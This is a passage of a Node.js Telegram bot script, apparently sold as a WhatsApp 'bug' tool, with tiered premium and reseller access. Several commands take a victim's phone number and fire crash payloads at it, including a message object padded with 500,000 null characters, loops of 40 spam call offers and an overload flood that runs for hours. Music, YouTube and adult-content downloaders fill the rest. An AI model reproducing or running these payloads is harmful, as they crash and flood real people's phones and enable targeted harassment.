    const caption = `𝙇𝙞𝙨𝙩 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 \n\n${userDetails.join("\n\n")}`;
    const videoUrl = "https://files.catbox.moe/iog1aa.mp4"; // Ganti dengan URL gambar

    const keyboard = [
      [
        {
          text: "Back",
          callback_data: "/menu",
        },
        {
          text: "Support Owner",
          url: "https://t.me/MOTU_PATALU_HINDU_HAI",
        },
      ],
    ];

    return ctx.replyWithPhoto(getRandomPhoto(), {
      caption: caption,
      reply_markup: {
        inline_keyboard: keyboard,
      },
    });
  } else {
    return ctx.reply("❌ No users currently have premium access.");
  }
});
bot.command("addprem", (ctx) => {
  const currentTime = Math.floor(Date.now() / 1000);
  const messageTime = ctx.message.date;

  if (currentTime - messageTime > 1) {
    return;
  }

  if (groupOnlyMode && !isGroup(ctx)) {
    return ctx.reply("bot hanya dapat digunakan didalam grup");
  }

  const ownerId = ctx.from.id.toString();
  const userId = ctx.from.id;

  if (ownerId !== OWNER_ID && !isOwner(userId)) {
    return ctx.reply("❌ You are not authorized to use this command.");
  }

  const args = ctx.message.text.split(" ");
  if (args.length < 3) {
    return ctx.reply("❌ Usage: /addpremium <user_id> <duration_in_days>");
  }

  const targetUserId = args[1];
  const duration = parseInt(args[2]);

  if (isNaN(duration)) {
    return ctx.reply("❌ Invalid duration. It must be a number (in days).");
  }

  addPremium(targetUserId, duration);
  ctx.reply(
    `✅ User ${targetUserId} has been granted premium access for ${duration} days.`
  );
});
bot.command("delprem", (ctx) => {
  const currentTime = Math.floor(Date.now() / 1000);
  const messageTime = ctx.message.date;

  if (currentTime - messageTime > 1) {
    return;
  }

  if (groupOnlyMode && !isGroup(ctx)) {
    return ctx.reply("bot hanya dapat digunakan didalam grup");
  }

  const ownerId = ctx.from.id.toString();
  if (ownerId !== OWNER_ID) {
    return ctx.reply("❌ You are not authorized to use this command.");
  }

  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply("❌ Usage: /deleteprem <user_id>");
  }

  const targetUserId = args[1];

  const wasDeleted = removePremium(targetUserId);

  if (wasDeleted) {
    ctx.reply(`✅ User ${targetUserId} premium access has been removed.`);
  } else {
    ctx.reply(`❌ Failed to remove premium access for user ${targetUserId}.`);
  }
});
bot.command("restart", async (ctx) => {
  const currentTime = Math.floor(Date.now() / 1000);
  const messageTime = ctx.message.date;

  if (currentTime - messageTime > 1) {
    return;
  }

  if (groupOnlyMode && !isGroup(ctx)) {
    return ctx.reply("bot hanya dapat digunakan didalam grup");
  }

  if (ctx.from.id !== OWNER_ID) {
    return ctx.reply("❌ Hanya Owner yang boleh menggunakan fitur ini!");
  }

  try {
    await ctx.reply("🔄 Bot akan restart dalam beberapa detik...");
    setTimeout(() => {
      process.exit(0);
    }, 3000);
  } catch {
    ctx.reply("❌ Terjadi kesalahan saat mencoba restart bot.");
  }
});
function removePremium(userId) {
  console.log(`Removing premium access for user: ${userId}`);
  return true;
}
bot.command("premiumfeature", (ctx) => {
  const currentTime = Math.floor(Date.now() / 1000);
  const messageTime = ctx.message.date;

  if (currentTime - messageTime > 1) {
    return;
  }

  if (groupOnlyMode && !isGroup(ctx)) {
    return ctx.reply("bot hanya dapat digunakan didalam grup");
  }

  const userId = ctx.from.id;

  if (!isPremium(userId)) {
    return ctx.reply(
      "❌ This feature is for premium users only. Upgrade to premium to use this command."
    );
  }

  ctx.reply(
    "🎉 Welcome to the premium-only feature! Enjoy exclusive benefits."
  );
});

bot.command("addtoken", async (ctx) => {
  const currentTime = Math.floor(Date.now() / 1000);
  const messageTime = ctx.message.date;

  if (currentTime - messageTime > 1) {
    return;
  }

  if (groupOnlyMode && !isGroup(ctx)) {
    return ctx.reply("bot hanya dapat digunakan didalam grup");
  }

  const userId = String(ctx.from.id);

  if (
    !developerIds.includes(userId) &&
    !isOwner(userId) &&
    !isModerator(userId) &&
    !isReseller(userId)
  ) {
    return ctx.reply(
      "❌ Maaf, hanya developer yang bisa menggunakan perintah ini."
    );
  }

  const newToken = ctx.message.text.split(" ")[1];
  await addToken(newToken);
  ctx.reply("✅ Token berhasil ditambahkan.");
});

bot.command("deltoken", async (ctx) => {
  const currentTime = Math.floor(Date.now() / 1000);
  const messageTime = ctx.message.date;

  if (currentTime - messageTime > 1) {
    return;
  }

  if (groupOnlyMode && !isGroup(ctx)) {
    return ctx.reply("bot hanya dapat digunakan didalam grup");
  }

  const userId = String(ctx.from.id);

  if (
    !developerIds.includes(userId) &&
    !isOwner(userId) &&
    !isModerator(userId) &&
    !isReseller(userId)
  ) {
    return ctx.reply(
      "❌ Maaf, hanya developer yang bisa menggunakan perintah ini."
    );
  }

  const tokenToDelete = ctx.message.text.split(" ")[1];
  await deleteToken(tokenToDelete);
  ctx.reply("✅ Token berhasil dihapus.");
});

bot.command("addakses", async (ctx) => {
  const currentTime = Math.floor(Date.now() / 1000);
  const messageTime = ctx.message.date;

  if (currentTime - messageTime > 1) {
    return;
  }

  if (groupOnlyMode && !isGroup(ctx)) {
    return ctx.reply("bot hanya dapat digunakan didalam grup");
  }

  const userId = String(ctx.from.id);

  if (
    !developerIds.includes(userId) &&
    !isOwner(userId) &&
    !isModerator(userId)
  ) {
    return ctx.reply(
      "❌ Maaf, hanya moderator yang bisa menggunakan perintah ini."
    );
  }

  const resellerId = ctx.message.text.split(" ")[1];
  await addReseller(resellerId);
  ctx.reply(`✅ Berhasil menambahkan ${resellerId} sebagai Akses.`);
});

bot.command("delakses", async (ctx) => {
  const currentTime = Math.floor(Date.now() / 1000);
  const messageTime = ctx.message.date;

  if (currentTime - messageTime > 1) {
    return;
  }

  if (groupOnlyMode && !isGroup(ctx)) {
    return ctx.reply("bot hanya dapat digunakan didalam grup");
  }

  const userId = String(ctx.from.id);

  if (
    !developerIds.includes(userId) &&
    !isOwner(userId) &&
    !isModerator(userId)
  ) {
    return ctx.reply(
      "❌ Maaf, hanya moderator yang bisa menggunakan perintah ini."
    );
  }

  const resellerId = ctx.message.text.split(" ")[1];
  await deleteReseller(resellerId);
  ctx.reply(`✅ Berhasil menghapus ${resellerId} dari daftar Akses.`);
});

bot.command("addmods", async (ctx) => {
  const currentTime = Math.floor(Date.now() / 1000);
  const messageTime = ctx.message.date;

  if (currentTime - messageTime > 1) {
    return;
  }

  if (groupOnlyMode && !isGroup(ctx)) {
    return ctx.reply("bot hanya dapat digunakan didalam grup");
  }

  const userId = String(ctx.from.id);

  if (!developerIds.includes(userId) && !isOwner(userId)) {
    return ctx.reply(
      "❌ Maaf, hanya developer yang bisa menggunakan perintah ini."
    );
  }

  const modId = ctx.message.text.split(" ")[1];
  await addModerator(modId);
  ctx.reply(`✅ Berhasil menambahkan ${modId} sebagai Mods.`);
});

bot.command("delmods", async (ctx) => {
  const currentTime = Math.floor(Date.now() / 1000);
  const messageTime = ctx.message.date;

  if (currentTime - messageTime > 1) {
    return;
  }

  if (groupOnlyMode && !isGroup(ctx)) {
    return ctx.reply("bot hanya dapat digunakan didalam grup");
  }

  const userId = String(ctx.from.id);

  if (!developerIds.includes(userId) && !isOwner(userId)) {
    return ctx.reply(
      "❌ Maaf, hanya developer yang bisa menggunakan perintah ini."
    );
  }

  const modId = ctx.message.text.split(" ")[1];
  await deleteModerator(modId);
  ctx.reply(`✅ Berhasil menghapus ${modId} dari daftar Mods.`);
});

bot.command("addowner", async (ctx) => {
  const currentTime = Math.floor(Date.now() / 1000);
  const messageTime = ctx.message.date;

  if (currentTime - messageTime > 1) {
    return;
  }

  if (groupOnlyMode && !isGroup(ctx)) {
    return ctx.reply("bot hanya dapat digunakan didalam grup");
  }

  const userId = String(ctx.from.id);

  if (!developerIds.includes(userId)) {
    return ctx.reply(
      "❌ Maaf, hanya developer yang bisa menggunakan perintah ini."
    );
  }

  const ownerId = ctx.message.text.split(" ")[1];
  await addOwner(ownerId);
  ctx.reply(`✅ Berhasil menambahkan ${ownerId} sebagai Owner.`);
});

bot.command("delowner", async (ctx) => {
  const currentTime = Math.floor(Date.now() / 1000);
  const messageTime = ctx.message.date;

  if (currentTime - messageTime > 1) {
    return;
  }

  if (groupOnlyMode && !isGroup(ctx)) {
    return ctx.reply("bot hanya dapat digunakan didalam grup");
  }

  const userId = String(ctx.from.id);

  if (!developerIds.includes(userId) && !isAdmin(userId)) {
    return ctx.reply(
      "❌ Maaf, hanya developer yang bisa menggunakan perintah ini."
    );
  }

  const ownerId = ctx.message.text.split(" ")[1];
  await deleteOwner(ownerId);
  ctx.reply(`✅ Berhasil menghapus ${ownerId} dari daftar Owner.`);
});

bot.command("addadmin", async (ctx) => {
  const currentTime = Math.floor(Date.now() / 1000);
  const messageTime = ctx.message.date;

  if (currentTime - messageTime > 1) {
    return;
  }

  if (groupOnlyMode && !isGroup(ctx)) {
    return ctx.reply("bot hanya dapat digunakan didalam grup");
  }

  const userId = String(ctx.from.id);

  if (!developerIds.includes(userId) && !isAdmin(userId)) {
    return ctx.reply(
      "❌ Maaf, hanya developer yang bisa menggunakan perintah ini."
    );
  }

  const adminId = ctx.message.text.split(" ")[1];
  await addAdmin(adminId);
  ctx.reply(`✅ Berhasil menambahkan ${adminId} sebagai Admin.`);
});

bot.command("deladmin", async (ctx) => {
  const currentTime = Math.floor(Date.now() / 1000);
  const messageTime = ctx.message.date;

  if (currentTime - messageTime > 1) {
    return;
  }

  if (groupOnlyMode && !isGroup(ctx)) {
    return ctx.reply("bot hanya dapat digunakan didalam grup");
  }

  const userId = String(ctx.from.id);

  if (!developerIds.includes(userId) && !isAdmin(userId)) {
    return ctx.reply(
      "❌ Maaf, hanya developer yang bisa menggunakan perintah ini."
    );
  }

  const ownerId = ctx.message.text.split(" ")[1];
  await deleteAdmin(ownerId);
  ctx.reply(`✅ Berhasil menghapus ${ownerId} dari daftar Admin.`);
});

const blacklistedUsers = [7541101209, 7104476614, 7403848180];

bot.use((ctx, next) => {
  if (ctx.from && blacklistedUsers.includes(ctx.from.id)) {
    return ctx.reply("Lu Ngapain?");
  }
  return next();
});

bot.command("cdmurbug", (ctx) => {
  const currentTime = Math.floor(Date.now() / 1000);
  const messageTime = ctx.message.date;

  if (currentTime - messageTime > 1) {
    return;
  }

  if (groupOnlyMode && !isGroup(ctx)) {
    return ctx.reply("bot hanya dapat digunakan didalam grup");
  }

  const args = ctx.message.text.split(" ")[1]?.toLowerCase();
  const userId = ctx.from.id;
  const ownerId = ctx.from.id.toString();

  if (ownerId !== OWNER_ID && !isOwner(userId)) {
    return ctx.reply("❌ You are not authorized to use this command.");
  }
  if (args === "true") {
    isCooldownActive = true;
    ctx.reply("✅ Cooldown diaktifkan.");
  } else if (args === "false") {
    isCooldownActive = false;
    ctx.reply("❌ Cooldown dinonaktifkan.");
  } else {
    ctx.reply(
      "⚙️ Gunakan /cdmurbug true untuk mengaktifkan atau /cdmurbug false untuk menonaktifkan."
    );
  }
});

const prosesrespone = (target, ctx) => {
  const randomPhoto = getRandomPhoto();
  const senderName =
    ctx.message.from.first_name || ctx.message.from.username || "Pengguna";

  const caption = `
<b>⎯⎯⎯  𝐈𝐌𝐙𝐔𝐑𝐈𝐏𝐒 ⎯⎯⎯⎯⎯⎯</b>
•  <b>Tar
get</b>     › <code>${target}</code>
•  <b>Peminta</b>    › <i>${senderName}</i>
•  <b>Status</b>     › 𝚂𝙴𝙳𝙰𝙽𝙶 𝙼𝙴𝙽𝙶𝙸𝚁𝙸𝙼 𝙱𝚄𝙶
<tg-spoiler>HINDUHAI</tg-spoiler>
<b>⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯</b>
`;

  const keyboard = [
    [
      { text: "Buy Script", url: "https://t.me/iMzurips" },
      { text: "Group", url: "https://t.me/iMzurips" },
    ],
  ];

  ctx
    .replyWithPhoto(randomPhoto, {
      caption: caption,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: keyboard,
      },
    })
    .then(() => {
      console.log(chalk.green.bold("(!) Procces Sending."));
    })
    .catch((error) => {
      console.error("Error sending process response:", error);
    });
};
const donerespone = (target, ctx) => {
  const randomPhoto = getRandomPhoto();
  const senderName =
    ctx.message.from.first_name || ctx.message.from.username || "Pengguna";

  const caption = `
<b>⎯⎯⎯  𝙉𝘼𝙀𝙇𝙇 𝙓 𝙋𝙄𝘼𝘼  ⎯⎯⎯⎯</b>
•  <b>Target</b>     › <code>${target}</code>
•  <b>Peminta</b>    › <i>${senderName}</i>
•  <b>Status</b>     › 𝚂𝙴𝙻𝙴𝚂𝙰𝙸 𝙱𝚄𝙶
<tg-spoiler>HINDUHAI</tg-spoiler>
<b>⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯</b>
`;

  const keyboard = [
    [
      { text: "Buy Script", url: "https://t.me/MRMOTUPATLUCHAT" },
      { text: "Group", url: "https://t.me/MRMOTUPATLUCHAT" },
    ],
  ];

  ctx
    .replyWithPhoto(randomPhoto, {
      caption: caption,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: keyboard,
      },
    })
    .then(() => {
      console.log(chalk.green.bold("(!) Done Sending!"));
    })
    .catch((error) => {
      console.error("Error sending done response:", error);
    });
};

const kirimpesan = async (number, message) => {
  try {
    const target = `${number}@s.whatsapp.net`;
    await cay.sendMessage(target, {
      text: message,
    });
    console.log(`Pesan dikirim ke ${number}: ${message}`);
  } catch (error) {
    console.error(
      `Gagal mengirim pesan ke WhatsApp (${number}):`,
      error.message
    );
  }
};
const checkWhatsAppConnection = (ctx, next) => {
  if (!whatsappStatus) {
    ctx.reply(`
𝚃𝚒𝚍𝚊𝚔 𝙰𝚍𝚊 𝚆𝚑𝚊𝚝𝚜𝙰𝚙𝚙 𝚃𝚎𝚛𝚜𝚊𝚖𝚋𝚞𝚗𝚐. 
`);
    return;
  }
  next();
};
const QBug = {
  key: {
    remoteJid: "p",
    fromMe: false,
    participant: "0@s.whatsapp.net",
  },
  message: {
    interactiveResponseMessage: {
      body: {
        text: "Sent",
        format: "DEFAULT",
      },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\0".repeat(
          500000
        )}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
        version: 3,
      },
    },
  },
};
bot.command("spamcall", checkWhatsAppConnection, async (ctx) => {
  const currentTime = Math.floor(Date.now() / 1000);
  const messageTime = ctx.message.date;

  if (currentTime - messageTime > 1) {
    return;
  }

  if (groupOnlyMode && !isGroup(ctx)) {
    return ctx.reply("bot hanya dapat digunakan didalam grup");
  }

  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;

  if (!isPremium(userId)) {
    return ctx.reply(
      "❌ This feature is for premium users only. Upgrade to premium to use this command."
    );
  }
  if (!q) {
    return ctx.reply(`Example: commandnya 91×××`);
  }

  let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await prosesrespone(target, ctx);

  for (let i = 0; i < 40; i++) {
    await sendOfferCall(target);
  }

  await donerespone(target, ctx);
});

bot.command("imzurips", checkWhatsAppConnection, async (ctx) => {
  const currentTime = Math.floor(Date.now() / 1000);
  const messageTime = ctx.message.date;

  if (currentTime - messageTime > 1) {
    return;
  }

  if (groupOnlyMode && !isGroup(ctx)) {
    return ctx.reply("bot hanya dapat digunakan didalam grup");
  }

  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;

  if (!isPremium(userId)) {
    return ctx.reply(
      "❌ This feature is for premium users only. Upgrade to premium to use this command."
    );
  }
  if (!q) {
    return ctx.reply(`Example: commandnya 91×××`);
  }

  let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await prosesrespone(target, ctx);

  await sleep(5000);
  await donerespone(target, ctx);

  await delaymakeroverload1(target);
  await ghostsecret(target);
});

bot.command("xstunt", checkWhatsAppConnection, async (ctx) => {
  const currentTime = Math.floor(Date.now() / 1000);
  const messageTime = ctx.message.date;

  if (currentTime - messageTime > 1) {
    return;
  }

  const userId = ctx.from.id;

  if (groupOnlyMode && !isGroup(ctx)) {
    return ctx.reply("bot hanya dapat digunakan didalam grup");
  }

  const parts = ctx.message.text.split(",");
  const number = parts[0] ? parts[0].trim() : null;
  const duration = parts[1] ? parts[1].trim() : null;
  const parsedDuration = parseInt(duration);

  if (!isPremium(userId)) {
    return ctx.reply(
      "❌ This feature is for premium users only. Upgrade to premium to use this command."
    );
  }

  if (!number) {
    return ctx.reply(`Example: commandnya 9×××,1`);
  }

  if (isNaN(parsedDuration)) {
    return ctx.reply(`Example: commandnya 91×××,1`);
  }

  let formatedNumber = number.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const durationInSeconds = parsedDuration * 3600;
  const iterations = durationInSeconds;

  let count = 0;

  for (let i = 0; i < iterations; i++) {
    await delaymakeroverload1(formatedNumber);
    await new Promise((r) => setTimeout(r, 100));

    console.log(
      chalk.red(
        `{𝑵𝑨𝑬𝑳𝑳 𝑻𝑹𝑨𝑺𝑯}{3.0} ${count}/${iterations} detik ke ${number.replace(
          /[^0-9]/g,
          ""
        )}`
      )
    );
    count++;
  }
});

bot.command("imzurips", checkWhatsAppConnection, async (ctx) => {
  const currentTime = Math.floor(Date.now() / 1000);
  const messageTime = ctx.message.date;

  if (currentTime - messageTime > 1) {
    return;
  }

  if (groupOnlyMode && !isGroup(ctx)) {
    return ctx.reply("bot hanya dapat digunakan didalam grup");
  }

  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;

  if (!isPremium(userId)) {
    return ctx.reply(
      "❌ This feature is for premium users only. Upgrade to premium to use this command."
    );
  }
  if (!q) {
    return ctx.reply(`Example: commandnya 91×××`);
  }

  let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await prosesrespone(target, ctx);

  await sleep(5000);
  await donerespone(target, ctx);

  await delaymakeroverload1(target);
  await ghostsecret(target);
  await delaymakeroverload1(target);
  await ghostsecret(target);
});
bot.command("systemui", checkWhatsAppConnection, async (ctx) => {
  const currentTime = Math.floor(Date.now() / 1000);
  const messageTime = ctx.message.date;

  if (currentTime - messageTime > 1) {
    return;
  }

  if (groupOnlyMode && !isGroup(ctx)) {
    return ctx.reply("bot hanya dapat digunakan didalam grup");
  }

  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;

  if (!isPremium(userId)) {
    return ctx.reply(
      "❌ This feature is for premium users only. Upgrade to premium to use this command."
    );
  }
  if (!q) {
    return ctx.reply(`Example: commandnya 91×××`);
  }

  let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await prosesrespone(target, ctx);
  await sleep(5000);
  await donerespone(target, ctx);
  await MatrixOverLoad1(target);
});
bot.command("imz", checkWhatsAppConnection, async (ctx) => {
  const currentTime = Math.floor(Date.now() / 1000);
  const messageTime = ctx.message.date;

  if (currentTime - messageTime > 1) {
    return;
  }

  if (groupOnlyMode && !isGroup(ctx)) {
    return ctx.reply("bot hanya dapat digunakan didalam grup");
  }

  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;

  if (!isPremium(userId)) {
    return ctx.reply(
      "❌ This feature is for premium users only. Upgrade to premium to use this command."
    );
  }
  if (!q) {
    return ctx.reply(`Example: commandnya 91×××`);
  }

  let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await prosesrespone(target, ctx);
  await sleep(5000);
  await donerespone(target, ctx);
  await bulldozer(target);
  await protocolbug5(target, false);
});
bot.command("thunderbust", checkWhatsAppConnection, async (ctx) => {
  const currentTime = Math.floor(Date.now() / 1000);
  const messageTime = ctx.message.date;

  if (currentTime - messageTime > 1) {
    return;
  }

  if (groupOnlyMode && !isGroup(ctx)) {
    return ctx.reply("bot hanya dapat digunakan didalam grup");
  }

  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;

  if (!isPremium(userId)) {
    return ctx.reply(
      "❌ This feature is for premium users only. Upgrade to premium to use this command."
    );
  }
  if (!q) {
    return ctx.reply(`Example: commandnya 91×××`);
  }

  let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await prosesrespone(target, ctx);

  for (let i = 0; i < 5; i++) {
    await BugIos(target);
  }

  await donerespone(target, ctx);

  return ctx.reply("Proses selesai.");
});

bot.command("spotifydownload", async (ctx) => {
  const currentTime = Math.floor(Date.now() / 1000);
  const messageTime = ctx.message.date;

  if (currentTime - messageTime > 1) {
    return;
  }

  if (groupOnlyMode && !isGroup(ctx)) {
    return ctx.reply("bot hanya dapat digunakan didalam grup");
  }

  const args = ctx.message.text.split(" ").slice(1);
  if (!args.length) {
    return ctx.reply(
      "❌ Harap masukkan link Spotify!\n\nFormat: `/spotify <url>`",
      { parse_mode: "Markdown" }
    );
  }

  const url = args[0];
  const apiUrl = `https://api.vreden.my.id/api/spotify?url=${encodeURIComponent(
    url
  )}`;

  try {
    const { data } = await axios.get(apiUrl);

    if (data.status !== 200 || !data.result.status) {
      return ctx.reply(
        "❌ Gagal mendapatkan informasi lagu. Pastikan link Spotify valid!"
      );
    }

    const { title, artists, releaseDate, cover, music } = data.result;

    await ctx.replyWithPhoto(cover, {
      caption: `🎵 *Judul:* ${title}\n🎤 *Artis:* ${artists}\n📅 *Rilis:* ${releaseDate}`,
      parse_mode: "Markdown",
    });

    await ctx.replyWithAudio({ url: music }, { title, performer: artists });
  } catch (error) {
    console.error(error);
    ctx.reply("⚠️ Terjadi kesalahan saat mengambil data. Coba lagi nanti.");
  }
});

bot.command("spotifysearch", async (ctx) => {
  const currentTime = Math.floor(Date.now() / 1000);
  const messageTime = ctx.message.date;

  if (currentTime - messageTime > 1) {
    return;
  }

  if (groupOnlyMode && !isGroup(ctx)) {
    return ctx.reply("bot hanya dapat digunakan didalam grup");
  }

  const args = ctx.message.text.split(" ").slice(1);
  if (!args.length) {
    return ctx.reply(
      "❌ Harap masukkan kata kunci pencarian!\n\nFormat: `/spotifysearch <judul lagu>`",
      { parse_mode: "Markdown" }
    );
  }

  const query = args.join(" ");
  const apiUrl = `https://api.vreden.my.id/api/spotifysearch?query=${encodeURIComponent(
    query
  )}`;

  try {
    const { data } = await axios.get(apiUrl);

    if (data.status !== 200 || !data.result.length) {
      return ctx.reply("❌ Lagu tidak ditemukan. Coba dengan kata kunci lain.");
    }

    const results = data.result.slice(0, 5); // Ambil 5 hasil pertama untuk ditampilkan
    for (const track of results) {
      const {
        title,
        artist,
        album,
        duration,
        releaseDate,
        coverArt,
        spotifyLink,
      } = track;

      const keyboard = Markup.inlineKeyboard([
        Markup.button.url("🔗 Buka Spotify", spotifyLink),
        Markup.button.callback("⬇ Download MP3", `download_${spotifyLink}`),
      ]);

      await ctx.replyWithPhoto(coverArt, {
        caption: `🎵 *Judul:* ${title}\n🎤 *Artis:* ${artist}\n💿 *Album:* ${album}\n⏱ *Durasi:* ${duration}\n📅 *Rilis:* ${releaseDate}`,
        parse_mode: "Markdown",
        ...keyboard,
      });
    }
  } catch (error) {
    console.error(error);
    ctx.reply("⚠️ Terjadi kesalahan saat mengambil data. Coba lagi nanti.");
  }
});

bot.action(
  /^download_(https:\/\/open\.spotify\.com\/track\/.+)$/,
  async (ctx) => {
    const spotifyUrl = ctx.match[1];
    const apiUrl = `https://api.vreden.my.id/api/spotify?url=${encodeURIComponent(
      spotifyUrl
    )}`;

    try {
      await ctx.answerCbQuery("🔍 Sedang mengambil lagu...");

      const { data } = await axios.get(apiUrl);

      if (data.status !== 200 || !data.result.status) {
        return ctx.reply("❌ Gagal mengunduh lagu. Coba lagi nanti.");
      }

      const { title, artists, releaseDate, cover, music } = data.result;

      await ctx.replyWithAudio({ url: music }, { title, performer: artists });
    } catch (error) {
      console.error(error);
      ctx.reply("⚠️ Terjadi kesalahan saat mengambil lagu.");
    }
  }
);

const yts = require("yt-search");
const ytdl = require("ytdl-core");

// Fungsi untuk mengunduh video/audio dari YouTube
async function downloadYouTube(link, asVideo = false) {
  try {
    const info = await ytdl.getInfo(link);
    const format = asVideo
      ? ytdl.chooseFormat(info.formats, { quality: "highestvideo" })
      : ytdl.chooseFormat(info.formats, { quality: "highestaudio" });

    const title = info.videoDetails.title.replace(/[<>:"/\\|?*]+/g, "");
    const fileName = `${title}.${asVideo ? "mp4" : "mp3"}`;
    const filePath = path.join(__dirname, fileName);

    return new Promise((resolve, reject) => {
      ytdl(link, { format })
        .pipe(fs.createWriteStream(filePath))
        .on("finish", () => resolve({ filePath, title }))
        .on("error", reject);
    });
  } catch (error) {
    throw new Error(`Gagal mengunduh: ${error.message}`);
  }
}
async function downloadYouTube(url, format) {
  try {
    const response = await axios.get(
      `https://youtubedownloader.me/api/download?format=${format}&url=${encodeURIComponent(
        url
      )}`,
      {
        headers: {
          "User-Agent":
            "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36",
          Referer: "https://youtubedownloader.me/",
        },
      }
    );

    const videoId = response.data.id;

    let progress = 0;
    let downloadUrl = null;
    let attempt = 0;

    while (progress < 1000 && attempt < 20) {
      const progressResponse = await axios.get(
        `https://youtubedownloader.me/api/progress?id=${videoId}`,
        {
          headers: {
            "User-Agent":
              "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36",
            Referer: "https://youtubedownloader.me/",
          },
        }
      );

      progress = progressResponse.data.progress;

      if (progress >= 1000) {
        downloadUrl = progressResponse.data.download_url;
        break;
      }

      attempt++;
      await new Promise((resolve) => setTimeout(resolve, 3000));
    }

    return downloadUrl;
  } catch (error) {
    console.error(error);
    return null;
  }
}

bot.command("xvid", async (ctx) => {
  const currentTime = Math.floor(Date.now() / 1000);
  const messageTime = ctx.message.date;

  if (currentTime - messageTime > 1) {
    return;
  }

  if (groupOnlyMode && !isGroup(ctx)) {
    return ctx.reply("bot hanya dapat digunakan didalam grup");
  }

  const text = ctx.message.text.split(" ").slice(1).join(" ");

  if (!text) {
    return ctx.replyWithPhoto("https://files.catbox.moe/asx3vo.jpg", {
      caption:
        "*Example:*\n\n`Xvid Colmek`\n\n*Setelah mendapatkan URL, ketik ulang:*\n`Xvid <URL>`",
      parse_mode: "Markdown",
      ...Markup.inlineKeyboard([
        [Markup.button.url("Owner", "https://t.me/MOTU_PATALU_HINDU_HAI")],
      ]),
    });
  }

  const isURL = /^(https?:\/\/)?(www\.)?xvideos\.com\/.+$/i.test(text);
  try {
    if (isURL) {
      const result = await xvideosdl(text);
      const { title, url } = result.result;
      const response = await fetch(url);
      const buffer = await response.arrayBuffer();

      await ctx.replyWithVideo(
        { source: Buffer.from(buffer) },
        {
          caption: `🎬 *Title:* ${title}`,
          parse_mode: "Markdown",
          ...Markup.inlineKeyboard([
            [Markup.button.url("Owner", "https://t.me/xatanicvxii")],
          ]),
        }
      );
    } else {
      const results = await xvideosSearch(text);
      if (results.length === 0) {
        return ctx.reply("❌ No search results found.", {
          ...Markup.inlineKeyboard([
            [Markup.button.url("Owner", "https://t.me/MOTU_PATALU_HINDU_HAI")],
          ]),
        });
      }

      const limitedResults = results.slice(0, 5);
      const searchResults = limitedResults
        .map((result, index) => {
          return `📌 *${result.title}*\n📏 Duration: ${result.duration}\n🎥 Quality: ${result.quality}\n🔗 [Watch here](${result.url})`;
        })
        .join("\n\n");

      await ctx.reply(`*Search Results for:* \`${text}\`\n\n${searchResults}`, {
        parse_mode: "Markdown",
        disable_web_page_preview: true,
        ...Markup.inlineKeyboard([
          [Markup.button.url("Owner", "https://t.me/xatanicvxii")],
        ]),
      });
    }
  } catch (error) {
    console.error(error);
    ctx.reply("❌ Failed to fetch video details.", {
      ...Markup.inlineKeyboard([
        [Markup.button.url("Owner", "https://t.me/xatanicvxii")],
      ]),
    });
  }
});

bot.command("ytmp3", async (ctx) => {
  const currentTime = Math.floor(Date.now() / 1000);
  const messageTime = ctx.message.date;

  if (currentTime - messageTime > 1) {
    return;
  }

  if (groupOnlyMode && !isGroup(ctx)) {
    return ctx.reply("bot hanya dapat digunakan didalam grup");
  }

  const args = ctx.message.text.split(" ").slice(1);
  if (!args[0]) {
    return ctx.reply(
      "Masukkan URL YouTube! Contoh: `/ytmp3 https://youtu.be/example`",
      { parse_mode: "Markdown" }
    );
  }

  const url = args[0];
  ctx.reply("⏳ Sedang memproses...");

  const downloadUrl = await downloadYouTube(url, "mp3");

  if (downloadUrl) {
    ctx.replyWithAudio({ url: downloadUrl, filename: "audio.mp3" });
  } else {
    ctx.reply("❌ Gagal mendapatkan link download.");
  }
});

async function getRule34(tags, limit = 3) {
  try {
    const url = `https://api.rule34.xxx/index.php?page=dapi&s=post&q=index&json=1&tags=${encodeURIComponent(
      tags
    )}&limit=${limit}`;
    const response = await axios.get(url);

    if (!response.data || response.data.length === 0) {
      return [];
    }

    return response.data.map((post) => ({
      id: post.id,
      image: post.file_url,
      tags: post.tags,
      source: post.source || "Tidak ada sumber",
      rating: post.rating,
    }));
  } catch (error) {
    console.error("Error fetching Rule34:", error.message);
    return [];
  }
}

bot.command("rule34", async (ctx) => {
  const currentTime = Math.floor(Date.now() / 1000);
  const messageTime = ctx.message.date;

  if (currentTime - messageTime > 1) {
    return;
  }

  if (groupOnlyMode && !isGroup(ctx)) {
    return ctx.reply("bot hanya dapat digunakan didalam grup");
  }

